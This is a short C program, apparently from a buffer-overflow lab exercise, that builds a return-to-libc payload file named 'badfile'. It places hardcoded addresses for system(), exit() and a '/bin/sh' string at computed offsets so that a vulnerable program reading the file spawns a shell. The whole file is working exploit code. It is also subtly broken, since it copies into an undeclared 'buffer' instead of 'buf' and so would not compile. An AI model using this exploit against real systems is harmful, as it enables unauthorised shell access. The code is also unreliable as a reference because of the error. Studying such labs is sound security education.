#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buf[300];
    FILE *badfile;
    int offset = 80 + 4;    // don't understand why the 4 bytes
    int X = offset + 8;
    int Y = offset;
    int Z = offset + 4;
    int shell_addr = 0xbffffdef;
    int system_addr = 0xb7e42da0;
    int exit_addr = 0xb7e369d0;

    badfile = fopen("./badfile", "w");

    /* Initialize buf with 0xaa (just a non-zero value) */
    memset(&buf, 0xaa, 300);   // Kool!

    /* Author did it this way which looks pretty cool!
    *(long *) &buf[X] = shell_addr ;   //  "/bin/sh"
    *(long *) &buf[Y] = system_addr ;   //  system()
    *(long *) &buf[Z] = exit_addr ;   //  exit()
    */
    memcpy(&buffer[X], &shell_addr, 4);
    memcpy(&buffer[Y], &system_addr, 4);
    memcpy(&buffer[Z], &exit_addr, 4);

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
